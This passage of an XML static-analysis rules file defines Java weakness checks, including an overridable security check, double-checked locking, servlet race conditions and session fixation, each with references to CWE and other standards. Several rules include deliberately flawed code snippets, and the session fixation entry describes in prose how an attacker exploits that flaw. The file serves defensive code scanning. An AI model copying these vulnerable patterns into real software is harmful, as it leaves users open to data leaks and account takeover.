																									   <p>[16] Standards Mapping - FIPS200 - (FISMA) <em>MP</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 3.6.1, Requirement 6.3.1.3, Requirement 6.5.8</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 3.6.1, Requirement 6.5.3</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 3.6.1, Requirement 6.5.3</em> <br></p>
																									   <p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 3.6.1, Requirement 6.5.8</em> <br></p>
																									   <p>[21] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-12 Cryptographic Key Establishment and Management (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>security-features</tag>
	</rule>
	<rule>
		<key>security_features_weak_securitymanager_check_overridable_method
		</key>
		<internalKey>Security Features/Weak SecurityManager Check/Overridable
			Method
		</internalKey>
		<name>Weak SecurityManager Check: Overridable Method</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Non-final methods that perform security checks can be overridden in ways that bypass security checks.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  If a method is overridden by a child class, the child class can bypass security checks in the parent class.<br><b>Example 1:</b> In the following code, <code>doSecurityCheck()</code> performs a security check and can be overridden by a child class.<br><pre><br>public class BadSecurityCheck {<br>private int id;<br><br>public BadSecurityCheck() {<br>    doSecurityCheck();<br>    id = 1;<br>}<br>protected void doSecurityCheck() {<br>    SecurityManager sm = System.getSecurityManager();<br>    if (sm != null) {<br>        sm.checkPermission(new SomePermission("SomeAction"));<br>    }<br>}<br>}<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A7 Missing Function Level Access Control</em> <br></p>
																									   <p>[2] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-3 Access Enforcement (P1)</em> <br></p>
																									   <p>[3] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 358</em> <br></p>
																									   <p>[4]  <em>M. S. Ware, "Writing secure Java code: taxonomy of heuristics and an evaluation of static analysis tools," M.S. Thesis, James Madison University, 2008.</em> <br></p>
																									   <p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M5 Poor Authorization and Authentication</em> <br></p>
																									   <p>[6] Standards Mapping - FIPS200 - (FISMA) <em>MP</em> <br></p>
																									   <p>[7] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.6</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>security-features</tag>
	</rule>
	<rule>
		<key>time_and_state_code_correctness_call_to_sleep___in_lock</key>
		<internalKey>Time and State/Code Correctness/Call to sleep() in Lock
		</internalKey>
		<name>Code Correctness: Call to sleep() in Lock</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Calling <code>sleep()</code> while holding a lock can cause a loss of performance and might cause a deadlock.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  If multiple threads are trying to obtain a lock on a resource, calling <code>sleep()</code> while holding a lock can cause all of the other threads to wait for the resource to be released, which can result in degraded performance and deadlock.<br><br><b>Example 1:</b> The following code calls <code>sleep()</code> while holding a lock.<br><pre><br>ReentrantLock rl = new ReentrantLock();<br>...<br>rl.lock();<br>Thread.sleep(500);<br>...<br>rl.unlock();<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A9 Application Denial of Service</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP6080 CAT II</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP6080 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP6080 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP6080 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP6080 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 557</em> <br></p>
																									   <p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.9</em> <br></p>
																									   <p>[9] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-5 Denial of Service Protection (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>time-and-state</tag>
	</rule>
	<rule>
		<key>time_and_state_code_correctness_double_checked_locking</key>
		<internalKey>Time and State/Code Correctness/Double-Checked Locking
		</internalKey>
		<name>Code Correctness: Double-Checked Locking</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Double-checked locking is an incorrect idiom that does not achieve the intended effect.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Many talented individuals have spent a great deal of time pondering ways to make double-checked locking work in order to improve performance. None have succeeded.<br><br><b>Example 1:</b> At first blush it may seem that the following bit of code achieves thread safety while avoiding unnecessary synchronization.<br><br><pre><br>if (fitz == null) {<br>  synchronized (this) {<br>    if (fitz == null) {<br>      fitz = new Fitzer();<br>    }<br>  }<br>}<br>return fitz;<br></pre><br><br>The programmer wants to guarantee that only one <code>Fitzer()</code> object is ever allocated, but does not want to pay the cost of synchronization every time this code is called. This idiom is known as double-checked locking.<br><br>Unfortunately, it does not work, and multiple <code>Fitzer()</code> objects can be allocated. See The "Double-Checked Locking is Broken" Declaration for more details [1].
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 609</em> <br></p>
																									   <p>[2] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[3] D. Bacon et al. <em>The "Double-Checked Locking is Broken" Declaration</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>time-and-state</tag>
	</rule>
	<rule>
		<key>time_and_state_j2ee_bad_practices_non_serializable_object_stored_in_session
		</key>
		<internalKey>Time and State/J2EE Bad Practices/Non-Serializable Object
			Stored in Session
		</internalKey>
		<name>J2EE Bad Practices: Non-Serializable Object Stored in Session
		</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Storing a non-serializable object as an <code>HttpSession</code> attribute can damage application reliability.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  A J2EE application can make use of multiple JVMs in order to improve application reliability and performance. In order to make the multiple JVMs appear as a single application to the end user, the J2EE container can replicate an <code>HttpSession</code> object across multiple JVMs so that if one JVM becomes unavailable another can step in and take its place without disrupting the flow of the application.<br><br>In order for session replication to work, the values the application stores as attributes in the session must implement the <code>Serializable</code> interface.<br><br><b>Example 1:</b> The following class adds itself to the session, but because it is not serializable, the session can no longer be replicated.<br><br><pre><br>public class DataGlob {<br>   String globName;<br>   String globValue;<br><br>   public void addToSession(HttpSession session) {<br>     session.setAttribute("glob", this);<br>   }<br>}<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A2 Broken Authentication and Session Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A3 Broken Authentication and Session Management</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A3 Broken Authentication and Session Management</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A7 Broken Authentication and Session Management</em> <br></p>
																									   <p>[5] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 579</em> <br></p>
																									   <p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[7] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.3</em> <br></p>
																									   <p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.7</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[11]  <em>The Java Servlet Specification</em> Sun Microsystems<br></p>
																									   <p>[12]  <em>The java.io.Serializable Interface</em> Sun Microsystems<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>time-and-state</tag>
	</rule>
	<rule>
		<key>time_and_state_j2ee_bad_practices_system_exit</key>
		<internalKey>Time and State/J2EE Bad Practices/System.exit
		</internalKey>
		<name>J2EE Bad Practices: System.exit</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  A web application should not attempt to shut down its container.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  It is never a good idea for a web application to attempt to shut down the application container. A call to <code>System.exit()</code> is probably part of leftover debug code or code imported from a non-J2EE application.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A9 Application Denial of Service</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP6080 CAT II</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP6080 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP6080 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP6080 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP6080 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 382</em> <br></p>
																									   <p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.9</em> <br></p>
																									   <p>[9] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-5 Denial of Service Protection (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>time-and-state</tag>
	</rule>
	<rule>
		<key>time_and_state_j2ee_bad_practices_threads</key>
		<internalKey>Time and State/J2EE Bad Practices/Threads</internalKey>
		<name>J2EE Bad Practices: Threads</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Thread management in a web application is forbidden in some circumstances and is always highly error prone.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Thread management in a web application is forbidden by the J2EE standard in some circumstances and is always highly error prone. Managing threads is difficult and is likely to interfere in unpredictable ways with the behavior of the application container. Even without interfering with the container, thread management usually leads to bugs that are hard to detect and diagnose like deadlock, race conditions, and other synchronization errors.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 383</em> <br></p>
																									   <p>[2]  <em>Java 2 Platform Enterprise Edition Specification, v1.4</em> Sun Microsystems<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>time-and-state</tag>
	</rule>
	<rule>
		<key>time_and_state_race_condition_format_flaw</key>
		<internalKey>Time and State/Race Condition/Format Flaw</internalKey>
		<name>Race Condition: Format Flaw</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The methods <code>parse()</code> and <code>format()</code> in <code>java.text.Format</code> contain a design flaw that can cause one user to see another user's data.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  The methods <code>parse()</code> and <code>format()</code> in <code>java.text.Format</code> contains a race condition that can cause one user to see another user's data.<br><br><b>Example 1:</b> The code below shows how this design flaw can manifest itself.<br><br><pre><br>public class Common {<br><br>    private static SimpleDateFormat dateFormat;<br>    ...<br><br>    public String format(Date date) {<br>        return dateFormat.format(date);<br>    }<br>    ...<br><br>    final OtherClass dateFormatAccess=new OtherClass();<br>    ...<br><br>    public void function_running_in_thread1(){<br>        System.out.println("Time in thread 1 should be 12/31/69 4:00 PM, found: "+ dateFormatAccess.format(new Date(0)));<br>    }<br><br>    public void function_running_in_thread2(){<br>        System.out.println("Time in thread 2 should be around 12/29/09 6:26 AM, found: "+ dateFormatAccess.format(new Date(System.currentTimeMillis())));<br>    }<br>}<br></pre><br><br>While this code will behave correctly in a single-user environment, if two threads run it at the same time they could produce the following output:<br><br>    Time in thread 1 should be 12/31/69 4:00 PM, found: 12/31/69 4:00 PM<br>    Time in thread 2 should be around 12/29/09 6:26 AM, found: 12/31/69 4:00 PM<br><br>In this case, the date from the first thread is shown in the output from the second thread due a race condition in the implementation of <code>format()</code>.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A6 Information Leakage and Improper Error Handling</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3630.1 CAT II</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3630.1 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3630.1 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3630.1 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3630.1 CAT II</em> <br></p>
																									   <p>[7]  <em>Bug 4228335 : SimpleDateFormat is not threadsafe</em> Sun Microsystems<br></p>
																									   <p>[8] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 362, CWE ID 488</em> <br></p>
																									   <p>[9] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 362</em> <br></p>
																									   <p>[10] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Insecure Interaction - CWE ID 362</em> <br></p>
																									   <p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[13] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-4 Information in Shared Resources (P1)</em> <br></p>
																									   <p>[14]  <em>The Java Servlet Specification</em> Sun Microsystems<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>time-and-state</tag>
	</rule>
	<rule>
		<key>time_and_state_race_condition_singleton_member_field</key>
		<internalKey>Time and State/Race Condition/Singleton Member Field
		</internalKey>
		<name>Race Condition: Singleton Member Field</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Servlet member fields might allow one user to see another user's data.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Many Servlet developers do not understand that a Servlet is a singleton. There is only one instance of the Servlet, and that single instance is used and re-used to handle multiple requests that are processed simultaneously by different threads.<br><br>A common result of this misunderstanding is that developers use Servlet member fields in such a way that one user may inadvertently see another user's data. In other words, storing user data in Servlet member fields introduces a data access race condition.<br><br><b>Example 1:</b> The following Servlet stores the value of a request parameter in a member field and then later echoes the parameter value to the response output stream.<br><br><pre><br>public class GuestBook extends HttpServlet {<br><br>   String name;<br><br>   protected void doPost (HttpServletRequest req,<br>                       HttpServletResponse res) {<br>     name = req.getParameter("name");<br>     ...<br>     out.println(name + ", thanks for visiting!");<br>   }<br>}<br></pre><br><br>While this code will work perfectly in a single-user environment, if two users access the Servlet at approximately the same time, it is possible for the two request handler threads to interleave in the following way:<br><br>	Thread 1:	assign "<code>Dick</code>" to <code>name</code><br>	Thread 2:	assign "<code>Jane</code>" to <code>name</code><br>	Thread 1:	print "<code>Jane, thanks for visiting!</code>"<br>	Thread 2:	print "<code>Jane, thanks for visiting!</code>"<br><br> Thereby showing the first user the second user's name.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A6 Information Leakage and Improper Error Handling</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3630.1 CAT II</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3630.1 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3630.1 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3630.1 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3630.1 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 362, CWE ID 488</em> <br></p>
																									   <p>[8] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 362</em> <br></p>
																									   <p>[9] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Insecure Interaction - CWE ID 362</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[13] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-4 Information in Shared Resources (P1)</em> <br></p>
																									   <p>[14]  <em>The Java Servlet Specification</em> Sun Microsystems<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>time-and-state</tag>
	</rule>
	<rule>
		<key>time_and_state_race_condition_static_database_connection_dbconn
		</key>
		<internalKey>Time and State/Race Condition/Static Database
			Connection(dbconn)
		</internalKey>
		<name>Race Condition: Static Database Connection(dbconn)</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Database connections stored in static fields will be shared between threads.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  A transactional resource object such as database connection can only be associated with one transaction at a time. For this reason, a connection should not be shared between threads and should not be stored in a static field. See Section 4.2.3 of the J2EE Specification for more details.<br><br><b>Example 1:</b><br><br><pre><br>public class ConnectionManager {<br><br>private static Connection conn = initDbConn();<br>...<br>}<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3630.1 CAT II</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3630.1 CAT II</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3630.1 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3630.1 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3630.1 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 362, CWE ID 567</em> <br></p>
																									   <p>[7] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 362</em> <br></p>
																									   <p>[8] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Insecure Interaction - CWE ID 362</em> <br></p>
																									   <p>[9]  <em>Java 2 Platform Enterprise Edition Specification, v1.4</em> Sun Microsystems<br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[11] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-4 Information in Shared Resources (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>time-and-state</tag>
	</rule>
	<rule>
		<key>time_and_state_session_fixation</key>
		<internalKey>Time and State/Session Fixation</internalKey>
		<name>Session Fixation</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Authenticating a user without invalidating any existing session identifier gives an attacker the opportunity to steal authenticated sessions. 
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Session fixation vulnerabilities occur when:<br><br>1. A web application authenticates a user without first invalidating the existing session, thereby continuing to use the session already associated with the user.<br><br>2. An attacker is able to force a known session identifier on a user so that, once the user authenticates, the attacker has access to the authenticated session.<br><br>In the generic exploit of session fixation vulnerabilities, an attacker creates a new session on a web application and records the associated session identifier. The attacker then causes the victim to authenticate against the server using that session identifier, giving the attacker access to the user's account through the active session.<br><br><b>Example:</b> The following example shows a snippet of code from a J2EE web application where the application authenticates users with a direct post to the <code>j_security_check</code>, which typically does not invalidate the existing session before processing the login request.<br><br><pre><br>&lt;form method="POST" action="j_security_check"&gt;<br>&lt;input type="text" name="j_username"&gt;<br>&lt;input type="text" name="j_password"&gt;<br>&lt;/form&gt;<br></pre><br><br>In order to exploit the code above, an attacker could first create a session (perhaps by logging into the application) from a public terminal, record the session identifier assigned by the application, and reset the browser to the login page. Next, a victim sits down at the same public terminal, notices the browser open to the login page of the site, and enters credentials to authenticate against the application. The code responsible for authenticating the victim continues to use the pre-existing session identifier, now the attacker simply uses the session identifier recorded earlier to access the victim's active session, providing nearly unrestricted access to the victim's account for the lifetime of the session.<br><br>Even given a vulnerable application, the success of the specific attack described here is dependent on several factors working in the favor of the attacker: access to an unmonitored public terminal, the ability to keep the compromised session active and a victim interested in logging into the vulnerable application on the public terminal. In most circumstances, the first two challenges are surmountable given a sufficient investment of time. Finding a victim who is both using a public terminal and interested in logging into the vulnerable application is possible as well, so long as the site is reasonably popular. The less well known the site is, the lower the odds of an interested victim using the public terminal and the lower the chance of success for the attack vector described above.<br><br>The biggest challenge an attacker faces in exploiting session fixation vulnerabilities is inducing victims to authenticate against the vulnerable application using a session identifier known to the attacker. In the example above, the attacker did this through a direct method that is not subtle and does not scale suitably for attacks involving less well-known web sites. However, do not be lulled into complacency; attackers have many tools in their belts that help bypass the limitations of this attack vector. The most common technique employed by attackers involves taking advantage of cross-site scripting or HTTP response splitting vulnerabilities in the target site [1]. By tricking the victim into submitting a malicious request to a vulnerable application that reflects JavaScript or other code back to the victim's browser, an attacker can create a cookie that will cause the victim to reuse a session identifier controlled by the attacker.<br><br>It is worth noting that cookies are often tied to the top level domain associated with a given URL. If multiple applications reside on the same top level domain, such as bank.example.com and recipes.example.com, a vulnerability in one application can allow an attacker to set a cookie with a fixed session identifier that will be used in all interactions with any application on the domain example.com [2].<br><br>Other attack vectors include DNS poisoning and related network based attacks where an attacker causes the user to visit a malicious site by redirecting a request for a valid site. Network based attacks typically involve a physical presence on the victim's network or control of a compromised machine on the network, which makes them harder to exploit remotely, their significance should not be overlooked. Less secure session management mechanisms, such as the default implementation in Apache Tomcat, allow session identifiers normally expected in a cookie to be specified on the URL as well, which enables an attacker to cause a victim to use a fixed session identifier simply by emailing a malicious URL.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A2 Broken Authentication and Session Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A3 Broken Authentication and Session Management</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A3 Broken Authentication and Session Management</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A7 Broken Authentication and Session Management</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3090 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3405 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3405 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3405 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3405 CAT I</em> <br></p>
																									   <p>[10]  <em>Cross-Site Scripting and Header Manipulation Descriptions</em> Fortify, An HP Company<br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 384</em> <br></p>
																									   <p>[12] Standards Mapping - FIPS200 - (FISMA) <em>IA</em> <br></p>
																									   <p>[13] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M9 Improper Session Handling</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.3</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.7</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[18] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-23 Session Authenticity (P1)</em> <br></p>
																									   <p>[19] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Session Fixation</em> <br></p>
																									   <p>[20] D. Whalen <em>The Unofficial Cookie FAQ</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>time-and-state</tag>
	</rule>
</rules>
